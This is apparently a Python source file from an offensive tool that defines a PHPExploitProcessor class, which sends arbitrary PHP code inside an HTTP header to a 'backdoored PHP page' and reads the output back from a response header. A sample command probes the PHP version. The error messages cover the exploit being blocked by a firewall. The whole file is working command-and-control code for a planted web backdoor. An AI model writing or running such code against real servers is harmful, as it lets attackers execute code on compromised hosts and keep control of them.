import requests  # HTTP requests
from Exceptions import *
from ExploitProcessor import ExploitProcessor

"""
@brief The PHPExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored PHP page.
        Inherits from the ExploitProcessor class. 
"""
class PHPExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__(host, path, method, header)

    """
    @brief See base class for details.
    """
    def _Base__version(self, options):
        res = self._Base__send_message(f"header('{self.header}: '"
                                       f" . phpversion());"
                                       f"exit;")
        print(res)

    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            self._Base__send_message(f"header('{self.header}: ' . phpversion());"
                                     f"exit;")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
    
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Unable to send message to server.")
